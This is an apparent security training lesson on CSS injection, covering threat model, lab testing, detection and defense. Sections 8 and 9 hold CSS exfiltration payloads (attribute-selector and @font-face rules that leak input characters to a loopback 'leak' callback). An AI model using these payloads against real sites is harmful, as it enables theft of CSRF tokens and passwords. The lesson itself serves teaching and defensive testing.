---
schema_version: 1
id: WEB-A05-CSS-INJECTION
title: "CSS Injection"
slug: css-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-116
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# CSS Injection

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain CSS Injection by root cause instead of just describing the consequences. 
- Identify the trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited. 
- Conduct controlled testing in a local lab and distinguish expected results from false positives. 
- Select root controls, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the flow of HTTP request/response in the situation of CSS Injection and how to apply input handling across trust boundaries. 
- Distinguish between authentication, authorization, and validation. 
- Be able to read code/configuration in the language or framework appearing in the example. 
- Have an isolated local lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

CSS has attribute selectors like `^=`, `$=`, and `*=` to match attribute values in DOM. CSS can also make resource requests through attributes like `background-image` or `@font-face`. Whether the request occurs or not depends on the selector, style cascade, element type, cache, and the browser's resource loading policy. [S1] [S2]

```html
<!-- Secure HTML configuration with Content Security Policy (CSP) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Normal Operation - CSP style-src and img-src</title>
    <!--
      The HTTP-equiv Content-Security-Policy header restricts style sources
      and prevents external background image requests, neutralizing CSS-based exfiltration.
    -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; style-src 'self'; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <h1>Welcome to our secure application</h1>
    <!-- CSRF token stored in input element is safe from CSS selector exfiltration -->
    <input type="hidden" id="csrf-token" value="abc123xyz">
</body>
</html>
```

## 4. Description and Root Cause

CSS Injection occurs when an actor controls the CSS source or a CSS context that the browser will parse. A selector can create a side channel regarding the actual value present in the attribute/DOM of a fixture; it does not itself read the live password value or cookie. The lesson only uses synthetic attributes and a callback loopback to demonstrate the correct request side effect. [S1] [S2] [S3]

> **Reference:** technical claims in the lesson are marked with a source; when applying in practice, compare with the version/framework being used: [S1], [S2], [S3], [S4].

## 5. Threat Model and Exploitation Conditions

- **Assets:** combined DOM value, style tree, and browser resource requests.  
- **Actor, authentication, and role:** user role customized with theme; victim is the logged-in user fixture.  
- **Exploitation conditions:** CSS controlled by the actor can be parsed in the style context, and selector match triggers a local side channel.  
- **Browser, proxy, framework, and version:** Chromium pinned with victim.lab.test and callback 127.0.0.1:9001; independent of server framework; must record actual image/package version along with evidence.  
- **Mandatory evidence:** the same correlation ID must connect input, decision control, and impact on the proper asset; individual status code is insufficient. [S1]

## 6. Attack Mechanism

For CSS injection, CSS controlled by the actor is parsed in the style context and selector matches trigger a local side channel. The positive case must demonstrate that the input reaches the correct sink and produces the described effect; the negative case should be blocked before any side effect when origin control is enabled. The conclusion only applies to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch Chromium pinned with victim.lab.test and callback 127.0.0.1:9001; not dependent on server framework; only load synthetic data, enable application/proxy/datastore logs, and attach correlation ID.
2. **Baseline:** send a valid input of the css injection use case; store raw request/response, decide policy and asset status before the test.
3. **Input and actions:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with request cap.
4. **Expected result:** only consider the vulnerable fixture as positive when logs show the “CSS controlled by actor is parsed in style context and selector matches to trigger local side channel” mechanism; secure fixture must block before side effects and boundary input must fail closed.
5. **Cleanup:** delete data, markers, and logs of the css injection; reclaim related session/cache, revert snapshot, and confirm no callbacks/processes remain from tests.
6. **Safety limits:** only run on loopback/`.lab.test`; do not use target, credentials, or real data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The probes below only use attribute/value and synthesized glyph, callback bind loopback. [S1]

Common CSS Injection exploitation techniques include:

*   **CSS Keylogger (Attribute-based Exfiltration)**: Use the CSS attribute selector to check the values of `<input>` tags. When the value matches the test character, the browser will load a background image from the attacker's server, sending that character.
    *   *Payload*:<!-- claim-source: [S1] -->
<!-- payload-id: WEB-A05-CSS-INJECTION-001 -->
<!-- context: Chromium fixture; attacker CSS is inserted into a same-document style element containing a synthetic input[value] -->
<!-- prerequisites: callback HTTP server bound to 127.0.0.1:9001; outbound network disabled; synthetic value limited to a, b or c -->
<!-- encoding: UTF-8 CSS; URL query values are ASCII and require no additional encoding -->
<!-- expected-result: the loopback callback records exactly one GET whose char value matches the first synthetic input character -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```css
        input[value^="a"] { background: url('http://127.0.0.1:9001/leak?char=a'); }
        input[value^="b"] { background: url('http://127.0.0.1:9001/leak?char=b'); }
        input[value^="c"] { background: url('http://127.0.0.1:9001/leak?char=c'); }
        ```
By combining multiple substring-matching selectors, an attacker can steal each character of the CSRF token or the user's password when the application autofills.
*   **@font-face Exfiltration (unicode-range)**: When the `value` attribute of the input is not available in DOM (for example, the user is typing directly), the attacker declares a custom font pointing to their server and limits the applicable character range (`unicode-range`). When the corresponding character appears on the screen, the browser loads the font from that URL and inadvertently reveals the inputted character.
    *   *Payload*:<!-- claim-source: [S1] -->
<!-- payload-id: WEB-A05-CSS-INJECTION-002 -->
<!-- context: Chromium fixture; attacker CSS defines a font applied to synthetic text containing lowercase a -->
<!-- prerequisites: callback HTTP server bound to 127.0.0.1:9001; outbound network disabled; font cache cleared before the case -->
<!-- encoding: UTF-8 CSS; unicode-range U+0061 denotes lowercase a -->
<!-- expected-result: rendering the synthetic lowercase a causes at most one GET to /leak?char=a on the loopback callback -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```css
        @font-face {
          font-family: LeakFont;
          src: url('http://127.0.0.1:9001/leak?char=a');
          unicode-range: U+0061; /* Hex for 'a' */
        }
        input { font-family: LeakFont, sans-serif; }
        ```
*   **CSS Timing Side-Channel**: Exploits the browser's graphics rendering processing time. An attacker designs extremely complex CSS selectors (for example, nesting thousands of levels or using complex SVG filters) to slow down the page rendering process when the matching condition is true. Measuring the response time or CPU activity of the browser allows the attacker to determine which character matches without needing to load resources from external sources.

## 9. Vulnerable Code and Secure Code

```html
<!-- === VULNERABLE CODE === -->
<!-- The application directly injects user-controlled style content without validation -->
<html>
<head>
    <style>
        /* User inputted styles are rendered directly here */
        /* If attacker input is: input[value^="sec"] { background: url("http://127.0.0.1:9001/leak?val=sec"); } */
        input[value^="sec"] { background: url("http://127.0.0.1:9001/leak?val=sec"); }
    </style>
</head>
<body>
    <form>
        <input type="text" name="secret_key" value="secret123">
    </form>
</body>
</html>

<!-- === SECURE CODE === -->
<!-- Implements a strict Content Security Policy and prevents inline stylesheet injection -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- SECURE: CSP blocks inline styles and restricts background image loading to self -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; style-src 'self'; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <form>
        <!-- The CSRF token is not vulnerable to CSS exfiltration under strict CSP -->
        <input type="hidden" name="csrf_token" value="safe_token_value">
    </form>
</body>
</html>
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to CSS Injection, the policy result, and correlation ID; do not log secrets or full tokens.
- Compare authorization/validation failures with the valid baseline and alert according to the behavior chain, not just one payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm that the request reached the sink and whether it had any impact.
- Scanner or WAF alert is only an investigation signal; it is not the sole proof that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Do not accept CSS freely; only provide the theme attribute defined by the server from the allowlist.
- Apply the same control to all routes, operations, and equivalent handling paths; failure must stop before any side effect.

### Defense-in-depth

With CSS Injection, the following measures help reduce blast radius or increase detection capability. Rate limit, UUID unpredictability, WAF, CSP, or general validation should not be used as a substitute for original controls.

- **Summary**: Absolutely do not allow users to directly insert CSS code, strictly enforce the content security policy (CSP), and do not store sensitive information in the direct display attributes of DOM. 
- **Detailed steps**:
  - Implement a strict Content Security Policy (CSP): restrict loading sources for CSS (`style-src 'self'`) and prohibit loading images from external sources (`img-src 'self'`).
  - Use specialized CSS sanitization libraries if it is necessary to allow users to upload stylesheets.
  - Do not place unnecessary secrets into DOM. Proper CSP `style-src` / `img-src` helps reduce the possibility of unintended style or callback injection but does not replace the practice of not accepting free CSS. [S1] [S2]

## 12. Retest

- **Positive case:** with CSS Injection, the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** the same input/resource but with an actor or context not allowed should be denied without leaking sensitive details.  
- **Boundary case:** test empty values, edge cases, different encodings, repeated requests, expired session state, and equivalent paths/operations.  
- **Telemetry:** verify that policy decisions, application logs, proxy logs, and datastore side effects match the correlation ID.  
- **Recheck:** save the minimal scenario that reproduces the old error and prove that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of CSS Injection without confirming side effects and logs. 
- Use a payload with correct syntax but the wrong DBMS, browser, framework, protocol, or injection context. 
- Consider UUID, rate limit, WAF, CSP, or general input validation as fixed by another original control. 
- Only fix one route while the same sink/policy is used in another route. 
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **CSS Injection**: Inserting the malicious code CSS into a website to manipulate the interface or steal information.
- **Attribute Selector**: An attribute selector in CSS used to find HTML tags based on their values.
- **CSP (Content Security Policy)**: A content security policy that helps prevent the loading of unauthorized resources.
- **Exfiltration**: The act of leaking or stealing data out of the system.
- **CSRF Token**: An unpredictable value, associated with a session or request, checked by the server to distinguish valid requests in the CSRF protection model. [S1]

## 16. Related Lessons and Further Reading

- [Cross-Site Scripting (XSS)](../xss/) — Vulnerability of injecting malicious code HTML/JavaScript into the application.

## 17. References

- **[S1]** OWASP WSTG — Testing for CSS Injection. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection — version/status: latest; accessed: 2026-07-17. 
- **[S2]** OWASP Cross Site Scripting Prevention Cheat Sheet — CSS contexts. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html — version/status: current version; accessed: 2026-07-17. 
- **[S3]** CWE-116 — Improper Encoding or Escaping of Output. https://cwe.mitre.org/data/definitions/116.html — version/status: CWE 4.20; accessed: 2026-07-17. 
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.